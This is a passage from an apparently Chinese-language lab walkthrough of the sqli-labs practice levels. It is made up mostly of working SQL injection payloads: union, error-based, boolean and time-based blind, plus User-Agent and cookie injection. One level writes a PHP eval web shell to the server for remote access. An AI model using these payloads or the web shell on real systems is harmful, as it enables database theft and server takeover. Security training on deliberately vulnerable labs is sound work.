<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1</span><br><span class="line"># s You are in...........</span><br><span class="line"></span><br><span class="line">?id&#x3D;1 --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot; --+</span><br><span class="line"># 正常显示（）</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot; and 1&#x3D;1 --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot; and 1&#x3D;0 --+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将 and 后的式子替换为 less-5 中的报错注入、布尔注入和时间注入即可。</p>
<hr>
<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>闭合方式：<code>id=((&#39;$id&#39;))</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;)) --+</span><br><span class="line"># 闭合SQL语句</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;)) union select 1, 2, &#39;&lt;?php @eval($_POST[&quot;pwd&quot;]) ?&gt;&#39; into outfile &#39;&#x2F;Users&#x2F;littlechieh6&#x2F;Documents&#x2F;project&#x2F;sqli-labs-php7&#x2F;shell.php&#39;--+</span><br><span class="line"># 会将查询结果保存到服务器端的目录下。可以考虑写入服务器后台</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后使用蚁剑进行连接即可 getshell。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8F46C7D8-A92A-4165-BBD9-4C81A65E76F7.png"></p>
<hr>
<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>闭合方式：<code>id=&#39;$id&#39;</code><br>和前面几题不同点在于：不输出报错信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1</span><br><span class="line"># You are in...........</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; --+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and 1&#x3D;1--+</span><br><span class="line"># 正常显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and 1&#x3D;0--+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br><span class="line"># 考虑参考less-5中的布尔注入进行测试</span><br><span class="line">?id&#x3D;1&#39; and substr(database(), 1, 1)&#x3D;&quot;a&quot;  --+</span><br><span class="line"># 不显示</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and substr(database(), 1, 1)&#x3D;&quot;s&quot;  --+</span><br><span class="line"># 正常显示，修改函数的内容，即可得到后面的内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
<p>无论怎么输入都是返回 You are in……。考虑使用时间盲注</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and sleep(3) --+</span><br><span class="line"># 使用--+或者%23，如果使用#浏览器可能不进行url编码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此处id=1，并且发现有延时。</p>
<p>这里依然考虑使用 if 语句来进行时间盲注（if 语句挺像C语言的三目运算符的）。类似前面的方法，使用 if+sleep 来先获取数据库名字的长度</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 1. 二分</span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&gt;0, sleep(3), 1) --+ # 延时，正常执行</span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&#x3D;0, sleep(3), 1) --+ # 不延时</span><br><span class="line"># 用来测试if语句是否正常执行</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&gt;10, sleep(3), 1) --+ # 不延时</span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&gt;5, sleep(3), 1) --+  # 延时，代表在 5, 10 之间</span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&gt;8, sleep(3), 1) --+  # 不延时，在 [8, 5)</span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&#x3D;8, sleep(3), 1) --+  # 延时，长度为8</span><br><span class="line"></span><br><span class="line">#2. 逐个测试</span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&#x3D;1, sleep(3), 1) --+  </span><br><span class="line">?id&#x3D;1&#39; and if(length(database())&#x3D;2, sleep(3), 1) --+  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>LEFT(str,len) 返回最左边的 len 个字符的字符串，或者 NULL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select left(&#39;foobarbar&#39;, 5);</span><br><span class="line">+----------------------+</span><br><span class="line">| left(&#39;foobarbar&#39;, 5) |</span><br><span class="line">+----------------------+</span><br><span class="line">| fooba                |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用 left 来爆破数据库的名字</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(left(database(), 1)&#x3D;&#39;a&#39;, sleep(3), 1) --+</span><br><span class="line">?id&#x3D;1&#39; and if(left(database(), 1)&#x3D;&#39;b&#39;, sleep(3), 1) --+</span><br><span class="line">……</span><br><span class="line">……</span><br><span class="line">?id&#x3D;1&#39; and if(left(database(), 1)&#x3D;&#39;s&#39;, sleep(3), 1) --+ # 明显延时</span><br><span class="line">?id&#x3D;1&#39; and if(left(database(), 2)&#x3D;&#39;sa&#39;, sleep(3), 1) --+ </span><br><span class="line">……</span><br><span class="line">……</span><br><span class="line">?id&#x3D;1&#39; and if(left(database(), 2)&#x3D;&#39;se&#39;, sleep(3), 1) --+ </span><br><span class="line"></span><br><span class="line"># 类似上面的方法，慢慢的增加长度，修改需要对比的字符串，可以得到完整的数据库名</span><br><span class="line">?id&#x3D;1&#39; and if(left(database(), 8)&#x3D;&#39;security&#39;, sleep(3), 1) --+ # 明显延时</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>爆表名的 Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;&#39;r&#39; , sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>需要注意：limit N,M : 相当于 limit M offset N , 从第 N 条记录开始（从0开始）, 返回 M 条记录。这里使用的limit x,1 查询第x个表名。</p>
</li>
<li><p>爆字段名的 Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),8)&#x3D;&#39;password&#39;, sleep(3), 1) --+</span><br><span class="line">?id&#x3D;1&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 9,1),8)&#x3D;&#39;username&#39;, sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>爆数据的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; and if(left((select password from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; , sleep(3), 1) --+</span><br><span class="line">?id&#x3D;1&#39; and if(left((select username from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; , sleep(3), 1) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p>
<p>将单引号改为双引号即可，其他相同。</p>
<hr>
<h2 id="Hackbar"><a href="#Hackbar" class="headerlink" title="Hackbar"></a>Hackbar</h2><p>11 到 21 关都是 POST 型，使用 Hackbar 可以方便的发送 POST 数据</p>
<ul>
<li>Chrome 有免费的 Hackbar</li>
<li>firefox 的 Hackbar 可以考虑用这个项目：<a target="_blank" rel="noopener" href="https://github.com/ox01024/hackbar_crack">https://github.com/ox01024/hackbar_crack</a></li>
</ul>
<p>基本操作：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B152DCD1-244C-418E-B784-37A5A28A0280.png"><br>enctype 属性：规定在发送到服务器之前应该如何对表单数据进行编码。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210114174430.png"></p>
<hr>
<h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p>闭合方式：<code>username=&#39;$uname&#39;</code></p>
<p>当我尝试使用 Hackbar 提交表单，Hackbar 给出 form.submit is not a function 的错误信息。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C3EB6EAC-10A7-43B1-8C43-7E168C81A664.png"><br>解决方法：将表单中的 &amp;submit=Submit 删掉。</p>
<p>后面按照回显方式的由易到难进行测试，这题能正常回显用户名和密码，说明可以正常使用联合注入进行回显。</p>
<ul>
<li><p>联合注入 Payload。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dum&#39; union select 1, 2 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>报错注入Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+</span><br><span class="line"># 数据库版本</span><br><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line"># 数据库名</span><br><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)--+</span><br><span class="line"># 表名</span><br><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),0x7e),1)--+</span><br><span class="line"># 字段名</span><br><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+</span><br><span class="line"># 数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到回显XPATH syntax error: ‘<del>8.0.19</del>‘，即可以进行报错注入，爆破信息同上面的方法。</p>
</li>
<li><p>布尔注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and 1&#x3D;1--+ # 正常登陆</span><br><span class="line">passwd&#x3D;D&amp;uname&#x3D;Dumb&#39; and 1&#x3D;2--+ # 登陆错误</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里非常类似前面 GET 的基于布尔的字符型注入。延时注入是基于布尔注入的，当界面无法进行回显的时候才会考虑使用延时注入。</p>
</li>
</ul>
<hr>
<h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>闭合方式：<code>password=(&#39;$passwd&#39;)</code></p>
<p>类似上题只使用一个单引号进行闭合，来观察报错信息，根据报错信息来进行注入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>就能看到如下报错信息<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B22699CD-05DD-41B8-A46E-19C3EB9BE8ED.png"><br>可以从上图看到，在单引号之后有一个单引号和括号，说明这题需要使用括号。</p>
<p>再次尝试闭合SQL语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;)  --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>正常登陆后，这题并没有显示查询结果，只是显示你是否登陆，所以不能使用联合注入。</p>
<p>尝试报错注入（报错注入通过报错信息进行回显）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;)  and updatexml(1, concat(0x7e, (select database()), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据回显结果可以看出：该题能正常回显报错信息，即可以进行报错注入。</p>
<p>尝试时间盲注。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;)  and if(left(database(), 1)&#x3D;&#39;s&#39;, sleep(3), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>能发现有明显的等待，即可以进行时间盲注。</p>
<hr>
<h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>闭合方式：<code>password=&quot;$passwd&quot;</code></p>
<p>类似前面的步骤进行测试。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;</span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以通过 报错信息观察到 SQL 语句的局部，通过局部来推测自己的SQL应该如何写。</p>
<p>报错注入 Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&quot; and updatexml(1, concat(0x7e, database(), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>时间盲注 Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&quot; and if(length(database())&#x3D;8, sleep(3), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>闭合方式：<code>password=&#39;$passwd&#39;</code></p>
<p>尝试使用前面的步骤回显出 SQL 语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;</span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没有回显报错信息，而且都登陆失败，猜测可能关闭和报错的输出</p>
<p>尝试直接注释，如果能SQL注入，那么用户名正确就能登陆系统。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;  --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>登陆成功。</p>
<p>我们可以在后面拼接 and，and 之后的值为 true 就会正常登陆，值为 false 就登陆失败。（我们拼接的 SQL 语句都在 where 后，where 语句的功能就是根据布尔值进行筛选）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39; and 1&#x3D;1  --+</span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39; and 1&#x3D;2  --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>闭合方式：<code>password=(&quot;$passwd&quot;)</code></p>
<p>方法同上</p>
<hr>
<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>闭合方式：<code>password = &#39;$passwd&#39;</code></p>
<p>进行简单测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39;</span><br><span class="line">passwd&#x3D;Dumb&amp;uname&#x3D;Dumb&#39; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>并没有结果返回</p>
<p>查看源码后发现，在执行SQL语句之前对输入的用户名做了检查。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// truncation (see comments)</span></span><br><span class="line">        $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">            &#123;</span><br><span class="line">            $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Quote if not a number</span></span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">            &#123;</span><br><span class="line">            $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        $value = intval($value);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<ul>
<li>magic_quotes_gpc 函数在 php 中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。在 magic_quotes_gpc = On 的情况下，如果输入的数据有：<ol>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜线（\）</li>
<li> NULL（NULL 字符）<br>（字符都会被加上反斜线）</li>
</ol>
</li>
<li>stripslashes() 删除由 addslashes() 函数添加的反斜杠</li>
<li>ctype_digit() 判断是不是数字，是数字就返回 true，否则返回 false</li>
<li>mysql_real_escape_string() 转义 SQL 语句中使用的字符串中的特殊字符。</li>
<li>intval()   整型转换</li>
</ul>
<p>但是没有对密码进行限制，password被直接拼接到SQL语句中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$update&#x3D;&quot;UPDATE users SET password &#x3D; &#39;$passwd&#39; WHERE username&#x3D;&#39;$row1&#39;&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后发现使用 <code>passwd=Dumb&#39; and 1=1 --+&amp;uname=Dumb</code> 会发生报错并将报错信息进行显示。发送下面的数据，就可以进行报错注入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&#39; and updatexml(1, concat(0x7e, user(), 0x7e), 1) --+&amp;uname&#x3D;Dumb</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>时间盲注 Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">passwd&#x3D;Dumb&#39;  WHERE username&#x3D;&#39;Dumb&#39; and if(1, sleep(3), 2) --+&amp;uname&#x3D;Dumb # 明显延时</span><br><span class="line">passwd&#x3D;Dumb&#39;  WHERE username&#x3D;&#39;Dumb&#39; and if(0, sleep(3), 2) --+&amp;uname&#x3D;Dumb</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>闭合方式：<code>VALUES (&#39;$uagent&#39;)</code>（两侧闭合）</p>
<p>登陆之后，发现查询到的信息是 User-agent，尝试在 Hackbar 添加 Header。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/65A5263E-2378-4E6B-BAEF-B7C5F43C18A9.png"><br>发现报错信息，说明可以采用报错注入的方式获得回显信息。</p>
<p>尝试闭合SQL语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1&#39; and sleep(3) --+</span><br><span class="line">1&#39; and sleep(3) #</span><br><span class="line">1&#39; and sleep(3) %23</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>并没有收获</p>
<p>查看源码后发现 password 和 username 都被上一题的检查函数所检查，而 User-agent 在另一个 SQL 语句（插入数据）中，所以不管怎么包裹都无法在 INSERT 语句中得到回显。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8BF2BB30-E839-4B64-AF48-5BD66400980E.png"><br>故需要换一种闭合方式（在两侧进行闭合）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#39; and sleep(3) and &#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>将 INSERT 语句闭合成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;&#39; and sleep(3) and &#39;&#39;, &#39;127.0.0.1&#39;, &#39;Dumb&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>uagent 字段就会被插入’’和’’进行与运算的结果（即0）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select &#39;&#39; and sleep(3) and &#39;&#39;;</span><br><span class="line">+------------------------+</span><br><span class="line">| &#39;&#39; and sleep(3) and &#39;&#39; |</span><br><span class="line">+------------------------+</span><br><span class="line">|                      0 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>报错注入payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#39; and updatexml(1, concat(0x7e, database(), 0x7e), 1) and &#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>闭合方式：<code>VALUES (&#39;$uagent&#39;)</code>（两侧闭合）</p>
<p>同上题配置，仅字段不同，报错注入 Payload<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B2E0F540-D020-4071-8CEC-6350DF9B793E.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#39; and updatexml(1, concat(0x7e, database(), 0x7e), 1) and &#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>闭合方式：<code>username=&#39;$cookee&#39;</code></p>
<p>推荐插件 <code>EditThisCookie</code></p>
<p>登陆之后，网页中存储了键为 Dumb、值为 Dumb的 Cookie。修改 Cookie 值之后，进行刷新就能看见报错信息</p>
